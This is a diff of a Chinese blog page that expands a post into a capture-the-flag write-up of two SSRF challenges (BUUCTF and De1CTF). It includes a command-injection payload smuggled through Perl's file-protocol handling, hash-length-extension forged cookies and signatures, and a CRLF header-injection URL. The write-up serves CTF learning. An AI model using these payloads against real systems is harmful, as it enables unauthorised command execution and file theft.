@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="基础,">
+  <meta name="keywords" content="WP,">
 
 
 
@@ -81,18 +81,21 @@
 
 
 
-<meta name="description" content="从BUUCTF一道题目看SSRFSSRFme&amp;lt;?php if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {   $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;] = $_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;]; } $sandbox = &amp;quot;sandbox/&amp;qu">
-<meta name="keywords" content="基础">
+<meta name="description" content="从BUUCTF和De1CTF两道题目看SSRF两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下">
+<meta name="keywords" content="WP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSRF">
 <meta property="og:url" content="http://yoursite.com/2019/08/02/SSRF/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="从BUUCTF一道题目看SSRFSSRFme&amp;lt;?php if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {   $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;] = $_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;]; } $sandbox = &amp;quot;sandbox/&amp;qu">
+<meta property="og:description" content="从BUUCTF和De1CTF两道题目看SSRF两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-03T04:53:05.732Z">
+<meta property="og:image" content="http://yoursite.com/2019/08/02/SSRF/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/02/SSRF/1.png">
+<meta property="og:updated_time" content="2019-08-08T04:39:34.801Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF">
-<meta name="twitter:description" content="从BUUCTF一道题目看SSRFSSRFme&amp;lt;?php if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {   $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;] = $_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;]; } $sandbox = &amp;quot;sandbox/&amp;qu">
+<meta name="twitter:description" content="从BUUCTF和De1CTF两道题目看SSRF两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/02/SSRF/2.png">
 
 
 
@@ -350,8 +353,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/基础/" itemprop="url" rel="index">
-                    <span itemprop="name">基础</span>
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
                   </a>
                 </span>
 
@@ -391,7 +394,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  598 字
+                  1.6k 字
                 </span>
               
 
@@ -407,7 +410,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  7 分钟
                 </span>
               
             </div>
@@ -428,7 +431,8 @@
       
 
       
-        <h2 id="从BUUCTF一道题目看SSRF"><a href="#从BUUCTF一道题目看SSRF" class="headerlink" title="从BUUCTF一道题目看SSRF"></a>从BUUCTF一道题目看SSRF</h2><h3 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h3><pre><code>&lt;?php
+        <h2 id="从BUUCTF和De1CTF两道题目看SSRF"><a href="#从BUUCTF和De1CTF两道题目看SSRF" class="headerlink" title="从BUUCTF和De1CTF两道题目看SSRF"></a>从BUUCTF和De1CTF两道题目看SSRF</h2><p>两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下<br><a id="more"></a></p>
+<h3 id="SSRFme-BUUCTF"><a href="#SSRFme-BUUCTF" class="headerlink" title="SSRFme(BUUCTF)"></a>SSRFme(BUUCTF)</h3><pre><code>&lt;?php
 if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) {
   $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];
 }
@@ -448,7 +452,141 @@ highlight_file(__FILE__);
 输出：Array([dirname] =&gt; /testweb [basename] =&gt; test.txt [extension] =&gt; txt)
 </code></pre><p>5.传入filename的最后一级文件夹并将shell_exec函数返回的数据写入文件，可以通过sandbox/+md5(orange+你的ip)/文件名访问</p>
 <p>访问根目录<br>    ?url=/&amp;filename=a</p>
-<p>ip查询</p>
+<p>ip查询，REMOTE_ADDR获取的访问的本机ip<br>之后可以在sandbox/…../a看到目录，有flag，但是无法访问</p>
+<p><img src="/2019/08/02/SSRF/2.png" alt=" "></p>
+<p>然后在大佬wp中发现</p>
+<pre><code>perl在open当中可以执行命令，如:open(FD, &quot;ls|&quot;)或open(FD, &quot;|ls&quot;)都可以执行ls命令  
+而GET是在perl下执行的，当GET使用file协议的时候就会调用到perl的open函数
+</code></pre><p>也就是GET中使用file协议可以执行命令，但是需要bash -c</p>
+<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入</p>
+<p>构造url：</p>
+<pre><code>?url=file:bash -c /readflag|&amp;filename=a    bash -c 执行了命令
+访问sandbox/...../a拿到flag
+</code></pre><h3 id="SSRFme-De1CTF"><a href="#SSRFme-De1CTF" class="headerlink" title="SSRFme(De1CTF)"></a>SSRFme(De1CTF)</h3><p>题目源码</p>
+<pre><code>/#! /usr/bin/env python
+/#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&apos;latin1&apos;)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+def __init__(self, action, param, sign, ip):
+    self.action = action
+    self.param = param
+    self.sign = sign
+    self.sandbox = md5(ip)
+    if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+        os.mkdir(self.sandbox)
+
+def Exec(self):
+    result = {}
+    result[&apos;code&apos;] = 500
+    if (self.checkSign()):
+        if &quot;scan&quot; in self.action:
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
+            resp = scan(self.param)
+            if (resp == &quot;Connection Timeout&quot;):
+                result[&apos;data&apos;] = resp
+            else:
+                print resp
+                tmpfile.write(resp)
+                tmpfile.close()
+            result[&apos;code&apos;] = 200
+        if &quot;read&quot; in self.action:
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
+            result[&apos;code&apos;] = 200
+            result[&apos;data&apos;] = f.read()
+        if result[&apos;code&apos;] == 500:
+            result[&apos;data&apos;] = &quot;Action Error&quot;
+    else:
+        result[&apos;code&apos;] = 500
+        result[&apos;msg&apos;] = &quot;Sign Error&quot;
+    return result
+
+def checkSign(self):
+    if (getSign(self.action, self.param) == self.sign):
+        return True
+    else:
+        return False
+
+
+/#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def geneSign():
+param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+action = &quot;scan&quot;
+return getSign(action, param)
+
+
+@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
+def challenge():
+action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+ip = request.remote_addr
+if(waf(param)):
+    return &quot;No Hacker!!!!&quot;
+task = Task(action, param, sign, ip)
+return json.dumps(task.Exec())
+@app.route(&apos;/&apos;)
+def index():
+return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+socket.setdefaulttimeout(1)
+try:
+    return urllib.urlopen(param).read()[:50]
+except:
+    return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+check=param.strip().lower()
+if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+    return True
+else:
+    return False
+
+
+if __name__ == &apos;__main__&apos;:
+app.debug = False
+app.run(host=&apos;0.0.0.0&apos;,port=80)
+</code></pre><p>题目分析：</p>
+<pre><code>def __init__（self, action, param, sign, ip）初始化self类，后面的都是self类的参数
+</code></pre><p>@app.route(‘/‘)改变url路径</p>
+<p>waf函数中strip函数删除了param参数前后缀的字符，lower函数将大写变成小写，并检测参数前缀是不是file和gopher，</p>
+<p>首先是前几天补的hash长度拓展攻击，geneSign函数那那可以得到action=scan时候的md5(key+param+action)，hashpump在action参数后面补位加了个read，生成新的md5和action参数，才可以打印出data的内容</p>
+<pre><code>/De1ta?param=http://139.180.128.86  
+Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%01%00%00%00%00%00%00read;sign=81670763d66ae6d466304b9106550817
+</code></pre><p>可以通过scan函数中urllib.urlopen(param).read()[:50]得到一部分网页内容</p>
+<pre><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;#! /usr/bin/env python\r\n#encoding=utf-8\r\nfrom flas&quot;}
+</code></pre><p>file和gopher协议都被过滤了，然后就卡住了，</p>
+<p>本来觉得可能是python urllib库的一个cve，后来发现好像不行<br>    <a href="http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo这样可以注入HTTP头" target="_blank" rel="noopener">http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo这样可以注入HTTP头</a><br>然后突然发现urlopen可以直接读取文件，结合hint：flag.txt直接让param为flag.txt就能拿到flag（太草了，那你弄什么waf函数</p>
+<pre><code>De1ta?param=flag.txt
+Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=d7163f39ab78a698b3514fd465e4018a
+</code></pre><p><img src="/2019/08/02/SSRF/1.png" alt=" "> </p>
 <h3 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）也就是说通过普通用户可以访问的网站，来攻击内部网络系统。</p>
 <p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能(服务器会响应用户的url请求)且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
 <p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>
@@ -469,7 +607,7 @@ highlight_file(__FILE__);
       
         <div class="post-tags">
           
-            <a href="/tags/基础/" rel="tag"># 基础</a>
+            <a href="/tags/WP/" rel="tag"># WP</a>
           
         </div>
       
@@ -491,6 +629,10 @@ highlight_file(__FILE__);
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/05/Xor异或解密/" rel="prev" title="Xor异或解密">
+                Xor异或解密 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -570,7 +712,7 @@ highlight_file(__FILE__);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -706,7 +848,7 @@ highlight_file(__FILE__);
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#从BUUCTF一道题目看SSRF"><span class="nav-number">1.</span> <span class="nav-text">从BUUCTF一道题目看SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRFme"><span class="nav-number">1.1.</span> <span class="nav-text">SSRFme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF介绍"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF介绍</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#从BUUCTF和De1CTF两道题目看SSRF"><span class="nav-number">1.</span> <span class="nav-text">从BUUCTF和De1CTF两道题目看SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRFme-BUUCTF"><span class="nav-number">1.1.</span> <span class="nav-text">SSRFme(BUUCTF)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRFme-De1CTF"><span class="nav-number">1.2.</span> <span class="nav-text">SSRFme(De1CTF)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF介绍"><span class="nav-number">1.3.</span> <span class="nav-text">SSRF介绍</span></a></li></ol></li></ol></div>
             
 
           </div>
